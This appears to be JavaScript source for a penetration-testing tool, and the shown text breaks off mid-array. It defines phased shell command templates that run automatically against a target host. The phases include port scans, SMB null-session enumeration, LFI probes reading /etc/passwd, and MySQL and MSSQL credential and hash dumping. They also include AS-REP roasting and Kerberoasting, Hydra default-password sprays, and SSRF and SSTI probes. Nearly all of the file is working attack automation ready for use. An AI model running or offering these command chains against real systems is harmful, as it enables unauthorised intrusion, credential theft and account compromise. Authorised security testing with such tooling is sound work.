
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
//  FULL RECON CHAIN
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

const FULL_RECON_STEPS = [
    // ══ Phase 1: Discovery ════════════════════════════════════════════════════
    {
        id: 'nmap_quick', label: 'Nmap Quick + Scripts', icon: 'fa-radar', phase: 'recon',
        cmd: function(r) {
            return 'nmap -sC -sV --open --top-ports 1000 ' + r + ' -v 2>&1';
        },
    },
    {
        id: 'nmap_full', label: 'Nmap Full TCP', icon: 'fa-magnifying-glass', phase: 'recon',
        cmd: function(r) {
            return 'nmap -sC -sV -p- --min-rate 5000 ' + r + ' --stats-every 15s -oN /tmp/nmap_full_' + r + '.txt -oX /tmp/nmap_full_' + r + '.xml 2>&1';
        },
    },
    {
        id: 'nmap_udp', label: 'UDP Top-100', icon: 'fa-satellite-dish', phase: 'recon',
        cmd: function(r) {
            return 'sudo nmap -sU --top-ports 100 -sV --open ' + r + ' 2>&1 || nmap -sU --top-ports 100 ' + r + ' 2>&1';
        },
    },
    // ══ Phase 2: Network basics ═══════════════════════════════════════════════
    {
        id: 'net_basics', label: 'NetBIOS / RPC / NFS', icon: 'fa-network-wired', phase: 'recon',
        cmd: function(r) {
            return 'echo "=== NBTscan ===" && (nbtscan ' + r + ' 2>&1 || true); echo "=== RPC info ===" && (rpcinfo -p ' + r + ' 2>&1 | head -30 || true); echo "=== NFS exports ===" && (showmount -e ' + r + ' 2>&1 || true); echo "=== nmap NFS ===" && nmap -p111,2049 --script="nfs-showmount,nfs-ls,nfs-statfs" ' + r + ' 2>&1 | head -40 || true';
        },
    },
    {
        id: 'dns_enum', label: 'DNS Zone Transfer', icon: 'fa-globe-europe-africa', phase: 'recon',
        condition: function(ports) { return ports.some(function(p){ return p.port === 53; }); },
        cmd: function(r, domain) {
            var dom = domain || r;
            return 'echo "=== Zone Transfer ===" && dig axfr @' + r + ' ' + dom + ' 2>&1 | head -60; echo "=== dnsrecon ===" && dnsrecon -d ' + dom + ' -n ' + r + ' -t axfr,std,brt 2>&1 | head -80 || true; echo "=== nmap DNS ===" && nmap -p53 --script="dns-zone-transfer,dns-brute,dns-recursion,dns-cache-snoop" ' + r + ' 2>&1 | head -50';
        },
    },
    // ══ Phase 3: SMB / Windows ════════════════════════════════════════════════
    {
        id: 'smb_vuln', label: 'SMB Vulns (EternalBlue)', icon: 'fa-skull-crossbones', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return p.port === 445 || p.port === 139; }); },
        cmd: function(r) {
            return 'nmap -p445,139 --script="smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve2009-3103,smb-vuln-regsvc-dos,smb-vuln-webexec,smb-double-pulsar-backdoor,smb2-vuln-uptime,smb-security-mode,smb2-security-mode,smb-os-discovery,smb-system-info,msrpc-enum,smb-enum-shares,smb-enum-users" -sV ' + r + ' 2>&1';
        },
    },
    {
        id: 'smb_cme', label: 'CrackMapExec / NXC', icon: 'fa-user-secret', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return p.port === 445 || p.port === 139; }); },
        cmd: function(r) {
            return 'echo "=== SMB fingerprint ===" && (nxc smb ' + r + ' 2>&1 || crackmapexec smb ' + r + ' 2>&1 || true); echo "=== Null session shares ===" && (nxc smb ' + r + " -u '' -p '' --shares 2>&1 || crackmapexec smb " + r + " -u '' -p '' --shares 2>&1 || true); echo \"=== Guest shares ===\" && (nxc smb " + r + " -u guest -p '' --shares 2>&1 || crackmapexec smb " + r + " -u guest -p '' --shares 2>&1 || true); echo '=== RID brute ===' && (nxc smb " + r + " -u '' -p '' --rid-brute 2>&1 | head -50 || true)";
        },
    },
    {
        id: 'smb_enum', label: 'SMB Deep Enum', icon: 'fa-folder-open', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return p.port === 445 || p.port === 139; }); },
        cmd: function(r) {
            return 'echo "=== smbmap ===" && smbmap -H ' + r + ' 2>&1; echo "=== enum4linux-ng ===" && (enum4linux-ng -A ' + r + ' 2>&1 || enum4linux -a ' + r + ' 2>&1 || true); echo "=== smbclient ===" && smbclient -L //' + r + ' -N 2>&1; echo "=== rpcclient ===" && (rpcclient -U "" -N ' + r + ' -c "enumdomusers;enumdomgroups;querydispinfo;getdompwinfo" 2>&1 | head -50 || true)';
        },
    },
    {
        id: 'rdp_vuln', label: 'RDP Vulns (BlueKeep)', icon: 'fa-desktop', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return p.port === 3389; }); },
        cmd: function(r) {
            return 'echo "=== RDP nmap ===" && nmap -p3389 --script="rdp-vuln-ms12-020,rdp-enum-encryption,rdp-enum-encryption" -sV ' + r + ' 2>&1; echo "=== BlueKeep (nuclei) ===" && (nuclei -u rdp://' + r + ':3389 -t /usr/share/nuclei-templates/cves/2019/CVE-2019-0708.yaml -silent 2>/dev/null | head -10 || true)';
        },
    },
    {
        id: 'winrm', label: 'WinRM / DCOM / PS Remoting', icon: 'fa-terminal', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return p.port === 5985 || p.port === 5986 || p.port === 47001; }); },
        cmd: function(r) {
            return 'echo "=== WinRM HTTP ===" && curl -sk -m 8 http://' + r + ':5985/wsman 2>&1 | head -10; echo "=== WinRM HTTPS ===" && curl -sk -m 8 https://' + r + ':5986/wsman 2>&1 | head -10; echo "=== nxc WinRM ===" && (nxc winrm ' + r + ' 2>&1 || crackmapexec winrm ' + r + ' 2>&1 || true)';
        },
    },
    // ══ Phase 4: Web ══════════════════════════════════════════════════════════
    {
        id: 'web_tech', label: 'Web Fingerprint', icon: 'fa-magnifying-glass-chart', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return [80,443,8080,8443,8000,8888,8008,3000,4000,5000,9000].indexOf(p.port) !== -1; }); },
        cmd: function(r) {
            var p = _fullReconPorts.find(function(x){ return [80,8080,8000,8888,3000,4000,5000,9000].indexOf(x.port) !== -1; });
            var port = p ? p.port : 80;
            var url = 'http://' + r + ':' + port;
            return 'echo "=== WhatWeb ===" && whatweb -a 3 ' + url + ' 2>/dev/null; echo "=== Headers ===" && curl -skI -m 10 ' + url + ' 2>/dev/null | head -25; echo "=== Interesting files ===" && for f in robots.txt .git/HEAD .git/config .env .env.backup .htaccess web.config phpinfo.php config.php backup.sql admin/index.php wp-login.php login.php server-status server-info crossdomain.xml sitemap.xml; do code=$(curl -sk -o /dev/null -w "%{http_code}" -m 5 ' + url + '/$f); [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code /$f"; done';
        },
    },
    {
        id: 'ssl_tls', label: 'SSL/TLS Vulns', icon: 'fa-lock-open', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return p.port === 443 || p.port === 8443 || p.port === 465 || p.port === 993 || p.port === 995; }); },
        cmd: function(r) {
            var sp = (_fullReconPorts.find(function(x){ return x.port === 443 || x.port === 8443; }) || {port:443}).port;
            return 'echo "=== testssl.sh ===" && (testssl.sh --severity HIGH --parallel --fast --color 0 ' + r + ':' + sp + ' 2>&1 || testssl --severity HIGH --parallel --fast --color 0 ' + r + ':' + sp + ' 2>&1 || echo "[!] testssl not found"); echo "=== nmap SSL ===" && nmap -p' + sp + ' --script="ssl-heartbleed,ssl-poodle,ssl-dh-params,ssl-ccs-injection,ssl-known-key,sslv2-drown,ssl-cert,ssl-enum-ciphers" ' + r + ' 2>&1';
        },
    },
    {
        id: 'web_fuzz', label: 'Web Dir Fuzz', icon: 'fa-robot', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return [80,443,8080,8443,8000,3000,8888].indexOf(p.port) !== -1; }); },
        cmd: function(r) {
            var p = _fullReconPorts.find(function(x){ return [80,8080,8000,3000,8888].indexOf(x.port) !== -1; });
            var port = p ? p.port : 80;
            var url = 'http://' + r + ':' + port;
            var wl  = '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt';
            var wlb = '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt';
            return 'feroxbuster --url ' + url + ' -w ' + wl + ' -t 40 -x php,html,txt,asp,aspx,jsp,bak,zip,json -q --no-state 2>/dev/null | head -120 || gobuster dir -u ' + url + ' -w ' + wl + ' -t 40 -x php,html,txt,asp,aspx,bak -q 2>/dev/null | head -100 || gobuster dir -u ' + url + ' -w ' + wlb + ' -t 30 -q 2>/dev/null | head -80';
        },
    },
    {
        id: 'web_vuln', label: 'Web Vulns (Nikto+Nuclei+NSE)', icon: 'fa-bug', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return [80,443,8080,8443,8000,3000].indexOf(p.port) !== -1; }); },
        cmd: function(r) {
            var p = _fullReconPorts.find(function(x){ return [80,8080,8000,3000].indexOf(x.port) !== -1; });
            var port = p ? p.port : 80;
            var url = 'http://' + r + ':' + port;
            return 'echo "=== Nikto ===" && nikto -h ' + url + ' -maxtime 240 -C all 2>&1; echo "=== Nuclei ===" && (nuclei -u ' + url + ' -severity critical,high,medium -silent -timeout 10 -c 25 2>/dev/null | head -60 || true); echo "=== nmap HTTP vulns ===" && nmap -p' + port + ' --script="http-vuln-cve2017-5638,http-vuln-cve2017-1001000,http-shellshock,http-phpmyadmin-dir-traversal,http-dombased-xss,http-stored-xss,http-csrf,http-sql-injection,http-internal-ip-disclosure,http-open-redirect,http-methods,http-auth-finder,http-backup-finder,http-config-backup,http-default-accounts,http-userdir-enum" ' + r + ' 2>&1 | head -80';
        },
    },
    {
        id: 'web_extra', label: 'Log4j / LFI / Admin Panels', icon: 'fa-radiation', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return [80,443,8080,8443,8000,3000].indexOf(p.port) !== -1; }); },
        cmd: function(r) {
            var p = _fullReconPorts.find(function(x){ return [80,8080,8000,3000].indexOf(x.port) !== -1; });
            var port = p ? p.port : 80;
            var url = 'http://' + r + ':' + port;
            return 'echo "=== Spring Boot actuator ===" && for ep in actuator env beans mappings health info metrics heapdump; do code=$(curl -sk -o /dev/null -w "%{http_code}" -m 5 ' + url + '/$ep); [ "$code" = "200" ] && echo "[EXPOSED] $code /$ep"; done; echo "=== Log4j (nuclei) ===" && (nuclei -u ' + url + ' -t /usr/share/nuclei-templates/cves/2021/CVE-2021-44228.yaml -t /usr/share/nuclei-templates/cves/2021/CVE-2021-45046.yaml -silent 2>/dev/null | head -10 || true); echo "=== Admin panels ===" && for panel in admin administrator phpmyadmin pma wp-admin manager panel dashboard login console setup install; do code=$(curl -sk -o /dev/null -w "%{http_code}" -m 5 ' + url + '/$panel); [ "$code" != "404" ] && [ "$code" != "000" ] && echo "$code /$panel"; done; echo "=== LFI test ===" && for lfi in "?page=../../../../etc/passwd" "?file=../../../../etc/passwd" "?path=../../../../etc/passwd" "?include=../../../../etc/passwd" "?doc=../../../../etc/passwd"; do out=$(curl -sk -m 5 "' + url + '/$lfi"); echo "$out" | grep -q "root:" && echo "[LFI FOUND] $lfi" && echo "$out" | grep "root:" | head -3; done';
        },
    },
    // ══ Phase 5: Databases / Cache ════════════════════════════════════════════
    {
        id: 'db_sql', label: 'SQL DBs (MySQL/MSSQL/Postgres)', icon: 'fa-database', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return [3306,1433,5432,1521,3050,5000].indexOf(p.port) !== -1; }); },
        cmd: function(r) {
            return 'echo "=== MySQL ===" && nmap -p3306 --script="mysql-info,mysql-empty-password,mysql-databases,mysql-enum,mysql-vuln-cve2012-2122" ' + r + ' 2>&1 | head -50; echo "=== MySQL anon connect ===" && (mysql -h ' + r + ' -u root --connect-timeout=5 -e "show databases;" 2>&1 | head -20 || mysql -h ' + r + ' -u "" --connect-timeout=5 -e "show databases;" 2>&1 | head -10 || true); echo "=== MSSQL ===" && nmap -p1433 --script="ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-dump-hashes,ms-sql-ntlm-info,ms-sql-xp-cmdshell" ' + r + ' 2>&1 | head -50; echo "=== PostgreSQL ===" && nmap -p5432 --script="pgsql-brute" --script-args "brute.firstonly=true,userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt" ' + r + ' 2>&1 | head -30; echo "=== Oracle ===" && (nmap -p1521 --script="oracle-tns-version,oracle-sid-brute" ' + r + ' 2>&1 | head -30 || true)';
        },
    },
    {
        id: 'db_nosql', label: 'NoSQL / Redis / Elastic', icon: 'fa-server', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return [6379,27017,9200,9300,11211,5984,7474,9042,6380].indexOf(p.port) !== -1; }); },
        cmd: function(r) {
            return 'echo "=== Redis ===" && (redis-cli -h ' + r + ' -p 6379 --no-auth-warning ping 2>&1; redis-cli -h ' + r + ' -p 6379 --no-auth-warning info server 2>&1 | head -20; redis-cli -h ' + r + ' -p 6379 --no-auth-warning CONFIG GET dir 2>&1 | head -6 || true); echo "=== MongoDB ===" && (nmap -p27017 --script="mongodb-info,mongodb-databases" ' + r + ' 2>&1 | head -40 || true); echo "=== Elasticsearch ===" && (curl -sk -m 10 http://' + r + ':9200/ 2>&1 | head -10; curl -sk -m 10 http://' + r + ':9200/_cat/indices?v 2>&1 | head -20 || true); echo "=== Memcached ===" && (echo "stats" | nc -w 3 ' + r + ' 11211 2>&1 | head -15 || true); echo "=== CouchDB ===" && (curl -sk -m 10 http://' + r + ':5984/_all_dbs 2>&1 | head -10 || true)';
        },
    },
    // ══ Phase 6: Remote access ════════════════════════════════════════════════
    {
        id: 'ssh_enum', label: 'SSH Audit', icon: 'fa-key', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return p.port === 22 || p.port === 2222 || (p.service||'').toLowerCase().includes('ssh'); }); },
        cmd: function(r) {
            var sp = (_fullReconPorts.find(function(x){ return x.port === 22 || x.port === 2222; }) || {port:22}).port;
            return 'echo "=== SSH banner ===" && (nc -w 3 ' + r + ' ' + sp + ' 2>&1 | head -3 || true); echo "=== SSH nmap ===" && nmap -p' + sp + ' --script="ssh2-enum-algos,ssh-auth-methods,ssh-hostkey,sshv1" ' + r + ' 2>&1; echo "=== ssh-audit ===" && (ssh-audit ' + r + ':' + sp + ' 2>&1 | head -60 || ssh-audit.py ' + r + ':' + sp + ' 2>&1 | head -60 || true)';
        },
    },
    {
        id: 'ftp_enum', label: 'FTP Enum + Backdoors', icon: 'fa-file-arrow-up', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return p.port === 21; }); },
        cmd: function(r) {
            return 'echo "=== FTP nmap ===" && nmap -p21 --script="ftp-anon,ftp-bounce,ftp-syst,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-libopie" ' + r + ' 2>&1; echo "=== FTP anon test ===" && printf "open ' + r + ' 21\\nuser anonymous anonymous\\nls\\nls -la\\nbye\\n" | ftp -inv 2>&1 | head -40 || true';
        },
    },
    {
        id: 'misc_svcs', label: 'VNC / Telnet / R-Services', icon: 'fa-plug', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return [5900,5901,5902,23,512,513,514].indexOf(p.port) !== -1; }); },
        cmd: function(r) {
            return 'echo "=== VNC ===" && nmap -p5900,5901,5902 --script="vnc-info,vnc-brute,realvnc-auth-bypass" --script-args brute.firstonly=true ' + r + ' 2>&1 | head -40 || true; echo "=== Telnet ===" && nmap -p23 --script="telnet-ntlm-info,telnet-encryption" ' + r + ' 2>&1 | head -20 || true; echo "=== R-Services ===" && nmap -p512,513,514 --script="rexec-brute,rlogin-brute,rsh-brute" --script-args brute.firstonly=true ' + r + ' 2>&1 | head -30 || true';
        },
    },
    // ══ Phase 7: Mail ═════════════════════════════════════════════════════════
    {
        id: 'smtp_enum', label: 'SMTP Enum + Open Relay', icon: 'fa-envelope', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return p.port === 25 || p.port === 587 || p.port === 465 || p.port === 110 || p.port === 143; }); },
        cmd: function(r) {
            return 'echo "=== SMTP nmap ===" && nmap -p25,587,465,110,143,993,995 --script="smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-open-relay,pop3-capabilities,imap-capabilities,imap-ntlm-info" --script-args "smtp-enum-users.methods={VRFY,EXPN,RCPT},smtp-open-relay.from=test@test.com,smtp-open-relay.to=test@gmail.com" ' + r + ' 2>&1 | head -80; echo "=== SMTP banner VRFY ===" && (printf "EHLO test\\r\\nVRFY root\\r\\nVRFY admin\\r\\nQUIT\\r\\n" | nc -w 5 ' + r + ' 25 2>&1 | head -20 || true)';
        },
    },
    {
        id: 'snmp_enum', label: 'SNMP Deep Enum', icon: 'fa-satellite-dish', phase: 'exploitation',
        condition: function(ports) { return ports.some(function(p){ return p.port === 161 || p.port === 162 || (p.service||'').toLowerCase().includes('snmp'); }); },
        cmd: function(r) {
            return 'echo "=== community strings ===" && (onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt ' + r + ' 2>&1 || onesixtyone ' + r + ' public private community 2>&1 || true); echo "=== snmpwalk v2c ===" && (snmpwalk -v2c -c public ' + r + ' 2>&1 | head -80 || true); echo "=== snmpwalk v1 ===" && (snmpwalk -v1 -c public ' + r + ' 2>&1 | head -30 || true); echo "=== nmap SNMP ===" && nmap -sU -p161 --script="snmp-info,snmp-sysdescr,snmp-brute,snmp-interfaces,snmp-netstat,snmp-processes,snmp-win32-software,snmp-win32-users" ' + r + ' 2>&1 | head -80';
        },
    },
    // ══ Phase 8: Comprehensive vuln scan ═════════════════════════════════════
    {
        id: 'nmap_vuln', label: 'Nmap --script=vuln (todos puertos)', icon: 'fa-shield-halved', phase: 'exploitation',
        cmd: function(r) {
            var ports = _fullReconPorts.map(function(p){ return p.port; }).join(',');
            var portArg = ports ? '-p' + ports : '--top-ports 500';
            return 'nmap ' + portArg + ' --script="vuln and not dos" --script-args unsafe=1 -sV --version-intensity 6 ' + r + ' 2>&1';
        },
    },
    {
        id: 'searchsploit', label: 'Searchsploit (versiones)', icon: 'fa-magnifying-glass-arrow-right', phase: 'exploitation',
        cmd: function(r) {
            return 'echo "=== Searchsploit nmap XML ===" && if [ -f /tmp/nmap_full_' + r + '.xml ]; then searchsploit --nmap /tmp/nmap_full_' + r + '.xml 2>&1 | head -100; else echo "[!] No XML; generando..."; nmap -sV --top-ports 200 ' + r + ' -oX /tmp/nmap_ss_' + r + '.xml 2>/dev/null && searchsploit --nmap /tmp/nmap_ss_' + r + '.xml 2>&1 | head -100; fi';
        },
    },
    // ══ Phase 9: Active Directory ═════════════════════════════════════════════
    {
        id: 'ad_recon', label: 'AD / LDAP / Kerberos', icon: 'fa-sitemap', phase: 'ad_attacks',
        condition: function(ports) { return ports.some(function(p){ return [389,636,3268,3269,88].indexOf(p.port) !== -1; }); },
        cmd: function(r, domain) {
            var dom = domain || 'domain.local';
            var dcParts = 'dc=' + dom.replace(/\./g, ',dc=');
            return 'echo "=== LDAP anonymous ===" && ldapsearch -x -H ldap://' + r + ' -b "" -s base namingContexts 2>&1; echo "=== LDAP domain info ===" && (ldapsearch -x -H ldap://' + r + ' -b "' + dcParts + '" "(objectClass=*)" 2>&1 | head -60 || true); echo "=== AS-REP Roasting ===" && (GetNPUsers.py ' + dom + '/ -dc-ip ' + r + ' -no-pass -format hashcat 2>&1 | head -40 || impacket-GetNPUsers ' + dom + '/ -dc-ip ' + r + ' -no-pass 2>&1 | head -40 || true); echo "=== Kerberoasting ===" && (GetUserSPNs.py ' + dom + '/ -dc-ip ' + r + ' -no-pass 2>&1 | head -20 || impacket-GetUserSPNs ' + dom + '/ -dc-ip ' + r + ' -no-pass 2>&1 | head -20 || true); echo "=== Kerbrute users ===" && (kerbrute userenum --dc ' + r + ' -d ' + dom + ' /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt 2>&1 | head -40 || true); echo "=== ldapdomaindump ===" && (ldapdomaindump ldap://' + r + ' -o /tmp/ldap_' + r + ' --no-json 2>&1 | head -20 || true)';
        },
    },
    // ══ Phase 10: Nuclei — ALL template categories ════════════════════════════
    {
        id: 'nuclei_full',
        label: 'Nuclei Full (CVEs+Misconfigs+Exposures+DefaultLogins)',
        icon: 'fa-radiation',
        phase: 'exploitation',
        cmd: function(r) {
            var p = _fullReconPorts.find(function(x){ return [80,8080,8000,443,8443,3000,8888].indexOf(x.port) !== -1; });
            var port = p ? p.port : 80;
            var proto = (port === 443 || port === 8443) ? 'https' : 'http';
            var url = proto + '://' + r + ':' + port;
            var svcUrls = _fullReconPorts
                .filter(function(x){ return [80,443,8080,8443,8000,8888,3000,4000,5000,9000,9090,9200,6379,27017,5432,3306].indexOf(x.port) !== -1; })
                .map(function(x){ return (x.port===443||x.port===8443?'https':'http')+'://'+r+':'+x.port; })
                .join(',');
            var targets = svcUrls || url;
            return [
                'echo "╔═══ NUCLEI — CVEs (Critical/High) ═══╗"',
                '(nuclei -u ' + url + ' -t cves/ -severity critical,high -silent -c 30 -timeout 15 -bulk-size 25 -rate-limit 100 2>/dev/null | head -80 || true)',
                'echo "╔═══ NUCLEI — Vulnerabilities ═══╗"',
                '(nuclei -u ' + url + ' -t vulnerabilities/ -severity critical,high,medium -silent -c 20 -timeout 15 2>/dev/null | head -60 || true)',
                'echo "╔═══ NUCLEI — Misconfigurations ═══╗"',
                '(nuclei -u ' + url + ' -t misconfiguration/ -silent -c 25 -timeout 10 2>/dev/null | head -60 || true)',
                'echo "╔═══ NUCLEI — Exposed Panels & Services ═══╗"',
                '(nuclei -u ' + url + ' -t exposures/ -t exposed-panels/ -silent -c 25 2>/dev/null | head -60 || true)',
                'echo "╔═══ NUCLEI — Default Logins ═══╗"',
                '(nuclei -u ' + url + ' -t default-logins/ -silent -c 20 -timeout 15 2>/dev/null | head -40 || true)',
                'echo "╔═══ NUCLEI — Technologies Detection ═══╗"',
                '(nuclei -u ' + url + ' -t technologies/ -silent -c 30 2>/dev/null | head -40 || true)',
                'echo "╔═══ NUCLEI — Network (all ports) ═══╗"',
                '(nuclei -target ' + r + ' -t network/ -severity critical,high,medium -silent -c 20 2>/dev/null | head -60 || true)',
                'echo "╔═══ NUCLEI — DNS Takeover / Cloud ═══╗"',
                '(nuclei -u ' + url + ' -t takeovers/ -t cloud/ -silent 2>/dev/null | head -30 || true)',
                'echo "╔═══ NUCLEI — File Exposure (env/git/backup) ═══╗"',
                '(nuclei -u ' + url + ' -t exposures/files/ -silent 2>/dev/null | head -30 || true)',
                'echo "╔═══ NUCLEI — CVEs (Medium) ═══╗"',
                '(nuclei -u ' + url + ' -t cves/ -severity medium -silent -c 15 -timeout 10 2>/dev/null | head -50 || true)',
            ].join('; ');
        },
    },
    // ══ Phase 11: Default Creds — todos los servicios detectados ══════════════
    {
        id: 'default_creds_all',
        label: 'Default Creds Spray (SSH/FTP/HTTP/DB/VNC/SMB)',
        icon: 'fa-key',
        phase: 'exploitation',
        cmd: function(r) {
            var cmds = ['echo "╔═══ DEFAULT CREDENTIALS SPRAY ═══╗"'];
            var ports = _fullReconPorts.map(function(p){ return p.port; });
            if (ports.indexOf(22) !== -1 || ports.indexOf(2222) !== -1) {
                var sshPort = ports.indexOf(22) !== -1 ? 22 : 2222;
                cmds.push('echo "── SSH Default Creds ──" && hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -t 4 -f ssh://' + r + ':' + sshPort + ' 2>&1 | grep -v "\\[DATA\\]\\|\\[STATUS\\]\\|\\[ERROR\\]" | head -30 || true');
            }
            if (ports.indexOf(21) !== -1) {
                cmds.push('echo "── FTP Anon + Default Creds ──" && hydra -l anonymous -p anonymous -t 4 -f ftp://' + r + ' 2>&1 | grep -E "login:|valid" | head -10 || true; hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -t 4 -f ftp://' + r + ' 2>&1 | grep -E "login:|valid" | head -20 || true');
            }
            if (ports.indexOf(3306) !== -1) {
                cmds.push('echo "── MySQL Empty Root ──" && mysql -h ' + r + ' -u root --connect-timeout=5 -e "select user,host,authentication_string from mysql.user;" 2>&1 | head -20 || true; nmap -p3306 --script mysql-empty-password ' + r + ' 2>&1 | head -15 || true');
            }
            if (ports.indexOf(5432) !== -1) {
                cmds.push('echo "── PostgreSQL Default Creds ──" && hydra -l postgres -p postgres -t 4 -f postgres://' + r + ' 2>&1 | grep -E "login:|valid" | head -10 || true; hydra -l postgres -p "" -t 4 postgres://' + r + ' 2>&1 | grep -E "login:|valid" | head -10 || true');
            }
            if (ports.indexOf(1433) !== -1) {
                cmds.push('echo "── MSSQL Default Creds ──" && nmap -p1433 --script ms-sql-empty-password ' + r + ' 2>&1 | head -20 || true; nmap -p1433 --script ms-sql-brute --script-args userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,passdb=/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt ' + r + ' 2>&1 | head -30 || true');
            }
            if (ports.indexOf(6379) !== -1) {
                cmds.push('echo "── Redis No-Auth Test ──" && redis-cli -h ' + r + ' -p 6379 --no-auth-warning ping 2>&1; redis-cli -h ' + r + ' -p 6379 --no-auth-warning info server 2>&1 | head -10 || true; redis-cli -h ' + r + ' -p 6379 --no-auth-warning CONFIG GET dir 2>&1 | head -6 || true');
            }
            if (ports.indexOf(27017) !== -1) {
                cmds.push('echo "── MongoDB No-Auth ──" && mongo ' + r + '/admin --quiet --eval "db.adminCommand({listDatabases:1})" 2>&1 | head -20 || true; mongosh --host ' + r + ' --quiet --eval "db.adminCommand({listDatabases:1})" 2>&1 | head -20 || true');
            }
            if (ports.indexOf(445) !== -1 || ports.indexOf(139) !== -1) {
                cmds.push('echo "── SMB Null/Guest Sessions ──" && (nxc smb ' + r + ' -u "" -p "" --shares 2>&1 | head -20 || crackmapexec smb ' + r + ' -u "" -p "" --shares 2>&1 | head -20 || true); (nxc smb ' + r + ' -u guest -p "" --shares 2>&1 | head -20 || true)');
            }
            if (ports.indexOf(5900) !== -1 || ports.indexOf(5901) !== -1) {
                cmds.push('echo "── VNC No-Auth ──" && nmap -p5900,5901 --script vnc-info,realvnc-auth-bypass ' + r + ' 2>&1 | head -20 || true');
            }
            if (ports.indexOf(161) !== -1) {
                cmds.push('echo "── SNMP Default Community ──" && onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt ' + r + ' 2>&1 | head -30 || true');
            }
            if (ports.indexOf(623) !== -1) {
                cmds.push('echo "── IPMI Default Creds ──" && (ipmitool -I lanplus -H ' + r + ' -U admin -P admin chassis status 2>&1 | head -10 || true); nmap -p623 --script ipmi-version,ipmi-brute ' + r + ' -sU 2>&1 | head -30 || true');
            }
            // Web default admin panels
            var webPorts = _fullReconPorts.filter(function(p){ return [80,443,8080,8443,8000,8888,3000].indexOf(p.port) !== -1; });
            if (webPorts.length > 0) {
                var wp = webPorts[0];
                var wurl = (wp.port===443||wp.port===8443?'https':'http') + '://' + r + ':' + wp.port;
                cmds.push('echo "── Web Default Admin Logins ──" && (nuclei -u ' + wurl + ' -t default-logins/ -silent -c 15 2>/dev/null | head -30 || true)');
                cmds.push('echo "── Hydra HTTP-POST common panels ──" && for path in /admin /login /administrator /wp-login.php /phpmyadmin/; do code=$(curl -sk -o /dev/null -w "%{http_code}" -m 5 ' + wurl + '$path); [ "$code" != "404" ] && [ "$code" != "000" ] && echo "[FOUND $code] ' + wurl + '$path"; done');
            }
            if (cmds.length === 1) {
                cmds.push('echo "[INFO] No common service ports detected for default creds spray"');
            }
            return cmds.join('; ');
        },
    },
    // ══ Phase 12: Advanced Web — SSRF/SSTI/XXE/CORS/GraphQL/JWT/Smuggling ════
    {
        id: 'web_adv_vulns',
        label: 'Advanced Web Vulns (SSRF/SSTI/XXE/CORS/GraphQL/JWT)',
        icon: 'fa-spider',
        phase: 'web_attacks',
        condition: function(ports) { return ports.some(function(p){ return [80,443,8080,8443,8000,3000,8888].indexOf(p.port) !== -1; }); },
        cmd: function(r) {
            var p = _fullReconPorts.find(function(x){ return [80,8080,8000,3000,8888].indexOf(x.port) !== -1; });
            var port = p ? p.port : 80;
            var proto = (port===443||port===8443) ? 'https' : 'http';
            var url = proto + '://' + r + ':' + port;
            return [
                'echo "╔═══ CORS Misconfiguration ═══╗"',
                'for origin in "https://evil.com" "null" "http://localhost"; do echo "Origin: $origin"; curl -sk -H "Origin: $origin" -I ' + url + ' 2>/dev/null | grep -i "access-control" | head -3; done',
                'echo "╔═══ SSRF Detection (common params) ═══╗"',
                'for param in "url" "uri" "path" "page" "redirect" "next" "file" "src" "href" "proxy" "dest" "destination" "host" "server" "endpoint"; do code=$(curl -sk -o /dev/null -w "%{http_code}" -m 5 "' + url + '?$param=http://127.0.0.1:22"); [ "$code" != "404" ] && [ "$code" != "400" ] && echo "[SSRF-CANDIDATE?$param=$code] ' + url + '?$param=http://127.0.0.1:22"; done',
                'echo "╔═══ SSTI Detection ═══╗"',
                'for param in "name" "q" "search" "query" "template" "page" "input"; do out=$(curl -sk -m 5 "' + url + '?$param={{7*7}}" 2>/dev/null); echo "$out" | grep -q "49" && echo "[SSTI-FOUND param=$param] {{7*7}}=49"; done',
                'echo "╔═══ GraphQL Endpoint Discovery ═══╗"',
